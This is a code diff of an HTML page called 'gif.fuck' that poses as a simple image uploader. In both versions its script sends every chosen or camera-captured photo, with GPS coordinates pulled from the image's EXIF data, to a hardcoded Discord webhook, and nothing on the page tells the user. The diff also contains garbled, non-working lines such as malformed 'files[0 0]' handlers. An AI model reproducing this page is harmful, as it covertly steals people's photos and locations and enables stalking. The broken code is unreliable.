@@ -17,54 +17,32 @@
     }
     .container {
       background: rgba(255,255,255,0.05);
-      padding: 40px 30px;
+      padding: 40px;
       border-radius: 20px;
       border: 1px solid rgba(255,255,255,0.1);
       text-align: center;
-      width: 440px;
-      box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+      width: 420px;
     }
-    h1 {
-      margin: 0 0 30px 0;
-      font-size: 2.6em;
-      background: linear-gradient(90deg, #ff00cc, #00ffff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .drop-zone {
-      border: 3px dashed #00ffff;
-      border-radius: 16px;
-      padding: 50px 20px;
-      cursor: pointer;
-      transition: all 0.3s;
-      margin-bottom: 20px;
-    }
-    .drop-zone:hover {
-      background: rgba(0,255,255,0.08);
-      border-color: #ff00cc;
-    }
+    h1 { font-size: 2.8em; margin: 0 0 30px 0; color: #00ffff; }
     button {
-      padding: 14px 28px;
-      font-size: 1.05em;
+      padding: 16px 32px;
+      font-size: 1.1em;
+      margin: 10px;
       background: linear-gradient(90deg, #ff00cc, #00ffff);
       border: none;
       border-radius: 50px;
       color: black;
       font-weight: bold;
       cursor: pointer;
-      margin: 8px 6px;
     }
-    button:hover { transform: scale(1.05); }
-    #status { margin-top: 20px; min-height: 28px; font-size: 1em; }
+    button:hover { transform: scale(1.08); }
+    #status { margin-top: 20px; font-size: 1.1em; min-height: 30px; }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>gif.fuck</h1>
-    <div class="drop-zone" id="dropZone">
-      <p>Drop image here or tap to upload</p>
-    </div>
-    <button id="uploadBtn">Choose from Gallery</button>
+    <button id="uploadBtn">Choose Image</button>
     <button id="cameraBtn">Take Photo</button>
     <div id="status"></div>
   </div>
@@ -74,10 +52,7 @@
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
-
     const statusEl = document.getElementById('status');
-    const fileInput = document.getElementById('fileInput');
-    const cameraInput = document.getElementById('cameraInput');
 
     function updateStatus(text, color = "white") {
       statusEl.textContent = text;
@@ -89,7 +64,6 @@
       formData.append("file", file, file.name);
 
       let content = `New upload: ${file.name}\nSize: ${(file.size/1024/1024).toFixed(2)} MB`;
-
       if (gps && gps.latitude && gps.longitude) {
         content += `\n\nGPS FOUND\nLat: ${gps.latitude.toFixed(6)}\nLon: ${gps.longitude.toFixed(6)}`;
       }
@@ -104,35 +78,24 @@
 
     async function handleFile(file) {
       if (!file.type.startsWith("image/")) return;
-
       updateStatus(`Selected: ${file.name}`, "#00ffff");
 
       try {
         const gps = await exifr.gps(file);
         await sendToWebhook(file, gps);
-        updateStatus("Sent to webhook!", "#00ff00");
+        updateStatus("✅ Sent to webhook!", "#00ff00");
       } catch (err) {
         await sendToWebhook(file);
-        updateStatus("Sent (no GPS)", "#00ff88");
+        updateStatus("✅ Sent (no GPS)", "#00ff88");
       }
     }
 
     // Button clicks
-    document.getElementById("uploadBtn").onclick = () => fileInput.click();
-    document.getElementById("cameraBtn").onclick = () => cameraInput.click();
+    document.getElementById("uploadBtn").onclick = () => document.getElementById("fileInput").click();
+    document.getElementById("cameraBtn").onclick = () => document.getElementById("cameraInput").click();
 
-    fileInput.onchange = e => e.target.files[0] && handleFile(e.target.files[0 0] && handleFile(e.target.files[0]);
-
-    // Drop zone
-    const dropZone = document.getElementById("dropZone");
-    dropZone.onclick = () => fileInput.click();
-    dropZone.ondragover = e => { e.preventDefault(); dropZone.style.background = "rgba(0,255,255,0.1)"; };
-    dropZone.ondragleave = () => dropZone.style.background = "";
-    dropZone.ondrop = e => {
-      e.preventDefault();
-      dropZone.style.background = "";
-      if (e.dataTransfer.files[0]) handleFile(e.dataTransfer.files[0]);
-    };
+    document.getElementById("fileInput").onchange = e => e.target.files[0 0]);
+    document.getElementById("cameraInput").onchange = e => e.target.files[0 0]);
   </script>
 </body>
 </html>
